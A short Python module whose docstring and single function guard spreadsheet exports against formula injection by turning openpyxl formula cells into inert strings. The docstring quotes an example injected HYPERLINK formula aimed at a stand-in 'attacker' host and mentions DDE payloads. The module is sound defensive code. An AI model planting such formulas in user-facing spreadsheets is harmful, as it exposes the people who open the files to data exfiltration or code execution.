"""Spreadsheet export safety.

Formula-injection guard: openpyxl marks any string cell whose value starts
with "=" as a live formula (data_type "f"), so user-supplied text that
round-tripped the database — a comment, well or rig name pasted from a
contractor's sheet like ``=HYPERLINK("http://attacker/…")`` or a DDE payload —
would execute in Excel for every user who exports. Our exports never write
intentional formulas, so the guard is absolute: force every inferred formula
cell back to a plain string. The cell's text is preserved verbatim (Excel
displays the literal "=…" characters); only its executability is removed.
"""
from openpyxl import Workbook


def neutralize_formula_cells(wb: Workbook) -> None:
    """Demote every formula-typed cell in the workbook to an inert string."""
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                if cell.data_type == "f":
                    cell.data_type = "s"
